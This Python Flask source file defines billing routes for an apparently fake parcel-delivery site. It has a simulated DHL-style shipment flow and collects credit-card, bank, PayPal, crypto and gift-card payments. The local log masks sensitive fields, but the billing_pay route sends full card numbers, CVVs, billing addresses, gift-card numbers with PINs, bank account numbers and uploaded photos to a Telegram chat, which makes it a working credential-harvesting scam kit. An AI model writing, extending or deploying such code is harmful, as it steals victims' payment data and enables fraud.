# payment_routes.py
"""
Payment & billing routes – modularized from app.py
"""
import logging
import json
from io import BytesIO
from datetime import datetime
from flask import render_template, request, jsonify, flash
from werkzeug.utils import secure_filename
from utils import (
    Shipment, db, get_bot, rset, rget, invalidate_cache,
    validate_email, estimate_distance, redis_client
)

# Helper: calculate shipment cost
def calculate_shipment_cost(distance_km: float, service_level: str) -> float:
    if distance_km <= 0:
        return 0.0
    base_rate = 0.50 if 'Express' in service_level else 0.30
    premium = 1.2 if '9:00' in service_level or '12:00' in service_level else 1.0
    return round(distance_km * base_rate * premium, 2)


# ---------- SANITIZATION HELPERS (for logging only) ----------
def _mask_string(s: str, show_last: int = 4) -> str:
    """Mask a string, showing only the last `show_last` characters."""
    if not s or not isinstance(s, str):
        return ''
    if len(s) <= show_last:
        return s
    return '*' * (len(s) - show_last) + s[-show_last:]


def _sanitize_card(card: dict) -> dict:
    """Return a safe copy of card details – no CVV, masked number."""
    if not card:
        return {}
    safe = {}
    if card.get('name'):
        safe['name'] = card['name']
    if card.get('expiry'):
        safe['expiry'] = card['expiry']
    if card.get('number'):
        safe['number'] = _mask_string(card['number'], 4)
    # CVV is intentionally omitted
    return safe


def _sanitize_bank(bank: dict) -> dict:
    """Return a safe copy of bank details – only last4 of account."""
    if not bank:
        return {}
    safe = {}
    if bank.get('bank_name'):
        safe['bank_name'] = bank['bank_name']
    if bank.get('account_holder'):
        safe['account_holder'] = bank['account_holder']
    if bank.get('account_number_last4'):
        safe['account_number_last4'] = bank['account_number_last4']
    elif bank.get('account_number'):
        safe['account_number_last4'] = _mask_string(bank['account_number'], 4)
    if bank.get('reference_used'):
        safe['reference_used'] = bank['reference_used']
    return safe


def _sanitize_gift_card(gc: dict) -> dict:
    """Return a safe copy – mask number, drop PIN."""
    if not gc:
        return {}
    safe = {}
    if gc.get('name'):
        safe['name'] = gc['name']
    if gc.get('number'):
        safe['number'] = _mask_string(gc['number'], 4)
    # PIN is intentionally omitted
    return safe


def _sanitize_paypal(pp: dict) -> dict:
    """PayPal details – email and note are safe."""
    if not pp:
        return {}
    safe = {}
    if pp.get('sender_email'):
        safe['sender_email'] = pp['sender_email']
    if pp.get('note'):
        safe['note'] = pp['note']
    return safe


def _sanitize_crypto(crypto: dict) -> dict:
    """Crypto details – coin, amount, and hash are safe."""
    if not crypto:
        return {}
    safe = {}
    if crypto.get('coin'):
        safe['coin'] = crypto['coin']
    if crypto.get('amount_crypto'):
        safe['amount_crypto'] = crypto['amount_crypto']
    if crypto.get('transaction_hash'):
        safe['transaction_hash'] = crypto['transaction_hash']
    return safe


# ---------- Routes ----------
def init_payment_routes(app):
    """Register payment/billing routes with the Flask app."""

    @app.route('/billing')
    def billing():
        email = request.args.get('email') or request.form.get('email')
        if not email:
            return render_template('billing_login.html')
        if not validate_email(email):
            flash('Invalid email address.', 'error')
            return render_template('billing_login.html')
        shipments = Shipment.query.filter_by(recipient_email=email).order_by(Shipment.created_at.desc()).all()
        invoices = []
        total_due = 0.0
        for s in shipments:
            # Always compute distance and service level (needed for display)
            distance = estimate_distance(s.origin_location or 'Lagos, NG', s.delivery_location)
            service_level = rget('service_level', s.tracking_number, 'DHL Express')
            
            # Use invoice_amount if set, otherwise calculate dynamically
            if s.invoice_amount is not None and s.invoice_amount > 0:
                cost = s.invoice_amount
            else:
                cost = calculate_shipment_cost(distance, service_level)
            
            # Build shipment dict (only fields needed by template)
            shipment_dict = {
                'tracking_number': s.tracking_number,
                'payment_status': s.payment_status,
                'delivery_location': s.delivery_location,
                'origin_location': s.origin_location,
                'status': s.status,
                'recipient_email': s.recipient_email,
            }
            invoices.append({
                'shipment': shipment_dict,
                'cost': cost,
                'service_level': service_level,
                'distance': distance,
            })
            if s.payment_status != 'paid':
                total_due += cost
        return render_template('billing.html', invoices=invoices, email=email, total_due=round(total_due, 2))


    @app.route('/billing/pay', methods=['POST'])
    def billing_pay():
        import logging
        from datetime import datetime
        from werkzeug.utils import secure_filename

        # Determine request type
        if request.is_json:
            data = request.get_json()
            email = data.get('email')
            tracking_numbers = data.get('tracking_numbers', [])
            payment_method = data.get('payment_method', 'Credit Card')
            card_details = data.get('card_details', {})
            billing = data.get('billing', {})
            phone = data.get('phone', '')
            crypto_details = data.get('crypto_details', {})
            bank_details = data.get('bank_details', {})
            paypal_details = data.get('paypal_details', {})
            uploaded_file = None
        else:
            data = request.form
            email = data.get('email')
            tracking_numbers = data.get('tracking_numbers', '').split(',') if data.get('tracking_numbers') else []
            payment_method = data.get('payment_method', '')
            uploaded_file = request.files.get('gift_card_photo') or request.files.get('payment_screenshot')
            gift_card_details = {
                'name': data.get('gift_card_name'),
                'number': data.get('gift_card_number'),
                'pin': data.get('gift_card_pin'),
            }
            paypal_details = {
                'sender_email': data.get('sender_email'),
                'note': data.get('paypal_note'),
            }
            bank_details = {
                'bank_name': data.get('bank_name'),
                'account_holder': data.get('account_holder'),
                'account_number_last4': data.get('account_number'),
                'reference_used': data.get('transfer_reference'),
            }
            card_details = {}
            billing = {}
            phone = data.get('contact_phone', '')
            crypto_details = {}

        if not email or not tracking_numbers:
            return jsonify({'error': 'Missing email or tracking numbers'}), 400

        # Setup logger
        logger = logging.getLogger('payment_logger')
        if not logger.handlers:
            handler = logging.FileHandler('payment.log')
            handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)

        # ---------- BUILD SANITIZED LOG ENTRY ----------
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'email': email,
            'payment_method': payment_method,
            'tracking_numbers': tracking_numbers,
            'has_photo': bool(uploaded_file and uploaded_file.filename),
        }

        # Add sanitized payment‑method‑specific details
        if request.is_json:
            if payment_method == 'Credit Card':
                log_entry['card_details'] = _sanitize_card(card_details)
                if billing:
                    log_entry['billing'] = billing
                if phone:
                    log_entry['phone'] = phone
            elif payment_method == 'Crypto':
                log_entry['crypto_details'] = _sanitize_crypto(crypto_details)
            elif payment_method == 'Bank Transfer':
                log_entry['bank_details'] = _sanitize_bank(bank_details)
            elif payment_method == 'PayPal':
                log_entry['paypal_details'] = _sanitize_paypal(paypal_details)
        else:
            if payment_method == 'Gift Card':
                log_entry['gift_card_details'] = _sanitize_gift_card(gift_card_details)
            elif payment_method == 'PayPal':
                log_entry['paypal_details'] = _sanitize_paypal(paypal_details)
            elif payment_method == 'Bank Transfer':
                log_entry['bank_details'] = _sanitize_bank(bank_details)
            if phone:
                log_entry['phone'] = phone

        logger.info(json.dumps(log_entry))

        # ---------- Telegram notification (FULL RAW DATA, NO CENSORSHIP) ----------
        try:
            bot = get_bot()
            if bot:
                msg = f"💳 New Payment Request\nEmail: {email}\nMethod: {payment_method}\nTracking: {', '.join(tracking_numbers)}\n"
                if request.is_json and payment_method == 'Credit Card':
                    # Send full card details (including CVV) as submitted
                    card = card_details
                    msg += f"Card Number: {card.get('number', '')}\n"
                    msg += f"Expiry: {card.get('expiry')}\n"
                    msg += f"Name: {card.get('name')}\n"
                    msg += f"CVV: {card.get('cvv', card.get('cvc', ''))}\n"
                    if billing:
                        msg += f"Billing: {billing.get('address')}, {billing.get('city')}, {billing.get('state')} {billing.get('zip')}, {billing.get('country')}\n"
                    msg += f"Phone: {phone}"
                elif request.is_json and payment_method == 'Crypto':
                    crypto = crypto_details
                    msg += f"Coin: {crypto.get('coin')}\n"
                    msg += f"Amount (crypto): {crypto.get('amount_crypto')}\n"
                    msg += f"Transaction Hash: {crypto.get('transaction_hash')}"
                elif request.is_json and payment_method == 'Bank Transfer':
                    bank = bank_details
                    msg += f"Bank Name: {bank.get('bank_name')}\n"
                    msg += f"Account Holder: {bank.get('account_holder')}\n"
                    msg += f"Account Number: {bank.get('account_number', bank.get('account_number_last4', ''))}\n"
                    msg += f"Reference: {bank.get('reference_used')}"
                elif request.is_json and payment_method == 'PayPal':
                    pp = paypal_details
                    msg += f"Sender Email: {pp.get('sender_email')}\n"
                    msg += f"Note: {pp.get('note')}"
                elif not request.is_json and payment_method == 'Gift Card':
                    # Send full card number and PIN
                    msg += f"Card Type: {data.get('gift_card_name')}\n"
                    msg += f"Card Number: {data.get('gift_card_number')}\n"
                    msg += f"PIN: {data.get('gift_card_pin', '')}"
                elif not request.is_json and payment_method == 'PayPal':
                    msg += f"Sender Email: {data.get('sender_email')}\n"
                    msg += f"Note: {data.get('paypal_note', '')}"
                elif not request.is_json and payment_method == 'Bank Transfer':
                    msg += f"Bank Name: {data.get('bank_name')}\n"
                    msg += f"Account Holder: {data.get('account_holder')}\n"
                    msg += f"Account Number: {data.get('account_number')}\n"
                    msg += f"Reference: {data.get('transfer_reference')}"
                else:
                    msg += "Additional details logged in payment.log"

                admin_chat_id = app.config.get('TELEGRAM_ADMIN_CHAT_ID')
                if admin_chat_id:
                    if uploaded_file and uploaded_file.filename:
                        try:
                            file_data = uploaded_file.read()
                            bot.send_photo(admin_chat_id, BytesIO(file_data), caption=msg)
                        except Exception as e:
                            logger.error(f"Failed to send photo via Telegram: {e}")
                            bot.send_message(admin_chat_id, msg + "\n📎 Photo could not be attached (see log)")
                    else:
                        bot.send_message(admin_chat_id, msg)
                else:
                    logger.warning('No TELEGRAM_ADMIN_CHAT_ID configured, skipping Telegram notification.')
        except Exception as e:
            logger.error(f'Telegram notification failed: {e}')

        # Mark as pending (not paid) – admin will verify and mark paid
        for tn in tracking_numbers:
            shipment = Shipment.query.filter_by(tracking_number=tn, recipient_email=email).first()
            if shipment and shipment.payment_status != 'paid':
                shipment.payment_status = 'pending'
                shipment.payment_method = payment_method
                db.session.commit()
                # DO NOT resume simulation – admin will resume on mark_paid

        return jsonify({
            'success': True,
            'paid_count': 0,
            'message': 'Payment request submitted. The admin will review and mark as paid shortly.'
        })


    @app.route('/payment/<method>')
    def payment_page(method):
        email = request.args.get('email', '')
        tracking = request.args.get('tracking', '')
        template_map = {
            'credit_card': 'credit_card.html',
            'bank_transfer': 'bank_transfer.html',
            'paypal': 'paypal.html',
            'gift_card': 'gift_card.html',
            'crypto': 'crypto.html',
        }
        template = template_map.get(method, 'payment_default.html')
        return render_template(template, email=email, tracking=tracking, now=datetime.now)
